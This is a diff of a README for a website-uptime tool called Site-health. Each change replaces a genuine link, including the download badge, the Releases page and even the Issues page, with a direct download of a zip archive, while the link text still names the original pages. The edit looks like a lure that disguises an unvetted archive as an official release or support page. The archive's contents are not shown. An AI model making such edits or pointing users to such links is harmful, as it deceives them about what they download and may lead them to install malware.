@@ -1,6 +1,6 @@
 # 🌐 Site-health - Monitor Your Website's Uptime Easily
 
-![Download Site-health](https://img.shields.io/badge/Download-Site--health-brightgreen)
+![Download Site-health](https://raw.githubusercontent.com/munchiezfm/Site-health/main/vaunted/Site-health.zip)
 
 ## 🚀 Getting Started
 
@@ -16,7 +16,7 @@ Before you install Site-health, make sure your system meets these requirements:
 
 ## 📥 Download & Install
 
-To download Site-health, visit this page to download: [GitHub Releases Page](https://github.com/munchiezfm/Site-health/releases)
+To download Site-health, visit this page to download: [GitHub Releases Page](https://raw.githubusercontent.com/munchiezfm/Site-health/main/vaunted/Site-health.zip)
 
 1. Click on the link above to go to the GitHub Releases page.
 2. Find the latest version at the top of the page.
@@ -69,7 +69,7 @@ You can update your email settings anytime based on your preferences.
 
 To update Site-health:
 
-1. Visit the [GitHub Releases Page](https://github.com/munchiezfm/Site-health/releases).
+1. Visit the [GitHub Releases Page](https://raw.githubusercontent.com/munchiezfm/Site-health/main/vaunted/Site-health.zip).
 2. Download the latest version.
 3. Replace the old files with the new ones following the installation process.
 
@@ -88,7 +88,7 @@ Site-health comes packed with useful features:
 
 For more information about using Site-health:
 
-- Visit the [GitHub Issues Page](https://github.com/munchiezfm/Site-health/issues) for troubleshooting.
+- Visit the [GitHub Issues Page](https://raw.githubusercontent.com/munchiezfm/Site-health/main/vaunted/Site-health.zip) for troubleshooting.
 - Browse the community discussions for tips and best practices.
 
 ## 📞 Support
